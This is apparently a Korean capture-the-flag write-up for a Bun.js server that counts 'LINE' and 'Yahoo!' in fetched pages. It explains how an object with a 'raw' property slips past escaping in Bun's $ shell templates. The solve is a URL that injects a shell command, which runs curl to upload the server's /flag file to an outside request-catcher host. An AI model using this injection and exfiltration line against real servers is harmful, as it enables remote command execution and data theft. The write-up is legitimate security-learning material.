# 키워드
- bunjs
- SSRF
- Curl

# 코드
```js
import {$, escapeHTML} from "bun";
import qs from "qs";

const port = process.env.PORT || 3000;
const logFile = process.env.LOGFILE || ".log";

const server = Bun.serve({
    host: "0.0.0.0",
    port: port,
    async fetch(req) {
        const url = new URL(req.url);
        if (url.pathname === "/chall") {
            const params = qs.parse(url.search, {ignoreQueryPrefix: true});
            if (params.url.length < escapeHTML(params.url).length) {    // dislike suspicious chars
                return new Response("sorry, but the given URL is too complex for me");
            }

            const lyURL = new URL(params.url, "https://www.lycorp.co.jp");
            if (lyURL.origin !== "https://www.lycorp.co.jp") {
                return new Response("don't you know us?");
            }

            const rawFetched = await $`curl -sL ${lyURL}`.text();
            const counts = {
                "L": [...rawFetched.matchAll(/LINE/g)].length,
                "Y": [...rawFetched.matchAll(/Yahoo!/g)].length,
            }
            await $`echo $(date '+%Y-%m-%dT%H:%M:%S%z') - ${params.url} ::: ${JSON.stringify(counts)} >> ${logFile}`;

            const highlighted = escapeHTML(rawFetched)
                .replace(/LINE/g, "<mark style='color: #06C755'>$&</mark>")
                .replace(/Yahoo!/g, "<mark style='color: #FF0033'>$&</mark>");
            const html = `
                <h1>Your score is... 🐐<${counts.L + counts.Y}</h1>
                <details open>
                    <summary>Result</summary>
                    <blockquote>${highlighted}</blockquote>            
                </details>
            `;
            return new Response(html, {headers: {"Content-Type": "text/html; charset=utf-8"}});
        } else {
            return new Response("🎶😺≡≡≡😺🎶 Happy Happy Happy~")
        }
    }
});

console.log(`😺 on http://localhost:${server.port}`);
```


# 분석
- 일단 기본적인 기능은 어떤 주소를 입력 받고 해당 주소에 있는 페이지에서 `"LINE"`, `"Yahoo!"`라는 문자열의 개수를 세는 간단한 페이지임
- 그런데 뒤에서 페이지 정보를 가져온 결과를 로그파일로 저장함
- 페이지 정보를 가져오는 방법은 [bunjs]([https://github.com/oven-sh/bun/blob/ee5fd51e885f16848f8e99a7c8a57e14b4a0d62e/src/shell/shell.zig](https://github.com/oven-sh/bun/blob/ee5fd51e885f16848f8e99a7c8a57e14b4a0d62e/src/shell/shell.zig "https://github.com/oven-sh/bun/blob/ee5fd51e885f16848f8e99a7c8a57e14b4a0d62e/src/shell/shell.zig"))라는 js 런타임 환경에서 `curl` 명령어를 실행시키는 방식

### bunjs
- `$`라는 키워드(?)로 템플릿을 처리하는데, 해당 동작 방식을 분석함
- 난생 처음보지만 `zig`라는 언어로 작성되어 있음
- 흥미로운 부분은 `raw`라는 property인데, `Object`가 `$shell`에 들어오면 string으로 사용함
```zig
if (template_value.isObject()) {
	if (template_value.getTruthy(globalThis, "raw")) |maybe_str| {
		const bunstr = maybe_str.toBunString(globalThis);
		defer bunstr.deref();
		if (!try builder.appendBunStr(bunstr, false)) {
			globalThis.throw("Shell script string contains invalid UTF-16", .{});
			return false;
		}
		return true;
	}
}
```


# Solve
- 문제 풀기 당시 노트북이었어서 서버를 만들기 힘들어서 걍 드림핵을 사용
- `curl` 사용할 때 `-F` 옵션으로 파일명 앞에 `@`를 사용하면 해당 파일의 내용을 출력해 줌
```
http://34.146.180.210:3000/chall?url[raw]=$(curl%20https://kcvztrl.request.dreamhack.games%20-F=@/flag)
```

